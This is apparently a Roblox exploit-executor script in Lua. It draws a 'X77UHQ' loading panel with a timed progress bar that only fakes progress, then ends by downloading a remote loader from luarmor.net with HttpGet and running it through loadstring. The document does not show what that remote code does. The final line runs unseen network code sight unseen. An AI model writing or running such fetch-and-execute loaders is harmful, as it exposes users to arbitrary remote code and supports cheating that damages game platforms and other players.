local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local gui = Instance.new("ScreenGui")
gui.Parent = CoreGui
gui.IgnoreGuiInset = true

local panel = Instance.new("Frame", gui)
panel.Size = UDim2.fromScale(0.35,0.22)
panel.Position = UDim2.fromScale(0.325,0.39)
panel.BackgroundColor3 = Color3.fromRGB(15,15,20)
panel.BorderSizePixel = 0
panel.ClipsDescendants = true
Instance.new("UICorner", panel).CornerRadius = UDim.new(0,20)

local stroke = Instance.new("UIStroke", panel)
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(0,200,255)

local title = Instance.new("TextLabel", panel)
title.Size = UDim2.fromScale(1,0.45)
title.Position = UDim2.fromScale(0,0.05)
title.BackgroundTransparency = 1
title.Text = "X77UHQ"
title.Font = Enum.Font.Arcade
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255,0,0)

local subtitle = Instance.new("TextLabel", panel)
subtitle.Size = UDim2.fromScale(1,0.2)
subtitle.Position = UDim2.fromScale(0,0.5)
subtitle.BackgroundTransparency = 1
subtitle.Text = "CHARGEMENT..."
subtitle.Font = Enum.Font.GothamBold
subtitle.TextScaled = true
subtitle.TextColor3 = Color3.fromRGB(255,255,255)

local barBg = Instance.new("Frame", panel)
barBg.Size = UDim2.fromScale(0.8,0.08)
barBg.Position = UDim2.fromScale(0.1,0.8)
barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
barBg.BorderSizePixel = 0
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,10)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(0,200,255)
bar.BorderSizePixel = 0
Instance.new("UICorner", bar).CornerRadius = UDim.new(0,10)

spawn(function()
	while gui.Parent do
		local c = Color3.fromHSV((tick()*0.2)%1,1,1)
		title.TextColor3 = c
		bar.BackgroundColor3 = c
		stroke.Color = c
		RunService.RenderStepped:Wait()
	end
end)

panel.BackgroundTransparency = 1
TweenService:Create(panel,TweenInfo.new(1),{BackgroundTransparency = 0}):Play()
title.TextTransparency = 1
TweenService:Create(title,TweenInfo.new(1),{TextTransparency = 0}):Play()
subtitle.TextTransparency = 1
TweenService:Create(subtitle,TweenInfo.new(1),{TextTransparency = 0}):Play()

local totalTime = 30
local steps = 100
local stepTime = totalTime / steps

for i = 1, steps do
	bar:TweenSize(UDim2.fromScale(i/steps,1), "Out", "Sine", stepTime, true)
	wait(stepTime)
end

TweenService:Create(panel,TweenInfo.new(0.5),{BackgroundTransparency = 1}):Play()
TweenService:Create(title,TweenInfo.new(0.5),{TextTransparency = 1}):Play()
TweenService:Create(subtitle,TweenInfo.new(0.5),{TextTransparency = 1}):Play()
wait(0.5)
gui:Destroy()

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/bbc3ea0dde107fad93f71c4a20b96040.lua"))()